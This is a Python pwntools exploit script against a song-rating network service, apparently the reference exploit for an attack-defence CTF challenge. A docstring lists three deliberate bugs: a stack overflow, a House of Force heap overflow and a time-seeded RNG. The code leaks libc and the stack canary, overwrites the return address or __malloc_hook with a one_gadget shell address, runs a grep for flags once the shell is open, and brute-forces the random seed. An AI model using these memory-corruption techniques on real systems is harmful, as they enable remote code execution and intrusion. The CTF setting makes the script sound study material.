#!/usr/bin/env python2

import sys
ip      = sys.argv[1]
port    = sys.argv[2]
flag_id = sys.argv[3]

from pwn import *
import os
from ctypes import cdll
# context.timeout = 10
context.log_level = 'error'
import json

""" Vulns

1. (Rate Song) Stack-Based Overflow
    - We allow reading/writing past a stack buffer boundary.

    - The main purpose of this vuln was to introduce a libc leak
    (__libc_start_main), which is necessary to exploit the other vulns.

    - You could also use it to exploit the program by:
        - Leaking the stack canary
        - Leaking __libc_start_main
        - Overflowing the stack buffer to overwrite the canary and the return address to &one_gadget_shell.

2. (Create Song) Heap Overflow - House of Force
    - malloc() for lyrics can overwrite the size of the next chunk
    - change the size of the next chunk so that the next call to malloc() allocates the tcache
    - fill tcache with &malloc_hook
    - malloc() again to allocate &malloc_hook, and write &shell there
    - malloc() to get shell

3. (Create/View Song) Bad Random Seed
    - The random seed is simply time(0).
    - This is easily spoofable and can be used to view all the songs on the system.
"""

# ========================================================
# Setup
# ========================================================

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote(ip, int(port))
# p = process('../service/ro/everybodys_got_something_to_hide')

shell_off = 0x4f322

# ========================================================
# Menu Interactions
# ========================================================

def send_menu_choice(choice):
    p.sendlineafter('> ', str(choice))

def create_song(song_len, lyrics, valid=True, confirm=False):
    send_menu_choice(1)
    p.sendlineafter('song? ', str(song_len))

    if valid:
        p.sendlineafter('listening.\n\n', lyrics)
        p.recvuntil('that? ')
        if not confirm:
            p.sendline('n')
        else:
            p.sendline('y')
            p.recvuntil('it... ')
            return int(p.recvline().strip())

def rate_song(song_len, lyrics):
    send_menu_choice(2)
    p.sendlineafter('song? ', str(song_len))
    p.sendlineafter('go?\n\n', lyrics)
    p.sendline()

def view_song(song_num):
    send_menu_choice(3)
    p.sendlineafter('at? ', str(song_num))

    text = p.recvline()
    if text == 'Bzzzt. Couldn\'t find that song!\n':
        return ''
    else:
        end = '---------------------------------------------\nWhat would you like to do, monkey'
        remaining = p.recvuntil(end)[:-len(end)]
        return text + remaining

def quit():
    send_menu_choice(4)

# ========================================================
# Exploit Helpers
# ========================================================

def get_leak_easy():
    p.recvuntil('monkey #')
    printf_addr = int(p.recvline().strip())
    libc_base = printf_addr - libc.symbols['printf']
    return libc_base

def get_leak_hard():
    rate_song(500, 'a')
    p.recvn(369)
    libc_start_main = u64(p.recvn(8))
    libc_base = libc_start_main - libc.symbols['__libc_start_main'] - 0xe7
    return libc_base

def get_leak(hard=True):
    if hard:
        return get_leak_hard()
    return get_leak_easy()

def get_canary():
    rate_song(500, 'a')
    p.recvn(0x141)
    return u64(p.recvn(8))

def get_flag():
    p.sendline('grep -r "' + flag_id + '" /home/chall/service/append')
    p.recvuntil('__')
    flag = p.recvline().strip()
    print(json.dumps({'payload' : {'flag' : flag}, 'error' : 0, 'error_msg' : ''}))
    p.close()

# ========================================================
# Exploits
# ========================================================

def exploit_stack():
    libc_base = get_leak()
    canary = get_canary()

    buf = cyclic(264, n=8)
    buf += p64(canary)
    buf += p64(libc_base + shell_off) * 5
    rate_song(264+16+4*8, buf)
    get_flag()

def exploit_heap():
    libc_base = get_leak()
    malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
    shell_addr = libc_base + shell_off

    # overwrite next chunk to point to be really large
    create_song(120, 120 * 'a' + p64(0xffffffffffffffff), valid=True, confirm=False)

    # malloc enough to make tcache next chunk
    # it's too large though so user won't be able to input data
    top        = 0x55c491d8b2e0
    heap_start = 0x55c491d8a000
    song_len = 0xffffffffffffffff - (top - heap_start)
    create_song(song_len, 'a', valid=False, confirm=False)

    # malloc tcache and overwrite next malloc with malloc_hook
    buf = p8(5) * 48
    buf += p64(malloc_hook_addr)
    buf += p64(malloc_hook_addr)
    create_song(len(buf)-8, buf, valid=True, confirm=False)

    # malloc malloc_hook and write shell address in it
    create_song(0, p64(shell_addr), valid=True, confirm=False)

    # call malloc to trigger shell
    create_song(123, '', valid=False, confirm=False)
    get_flag()

def exploit_srand():
    libc_run = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

    start_time = libc_run.time(0)
    for i in range(1000):
        libc_run.srand(start_time-i)
        song_num = libc_run.rand() % 1000000000
        text = view_song(song_num)
        if text and flag_id in text:
            flag = text[text.index('__')+2:].strip()
            print(json.dumps({'payload' : {'flag' : flag}, 'error' : 0, 'error_msg' : ''}))
            p.sendline('4')
            p.close()
            return

# exploit_stack()
exploit_heap()
# exploit_srand()
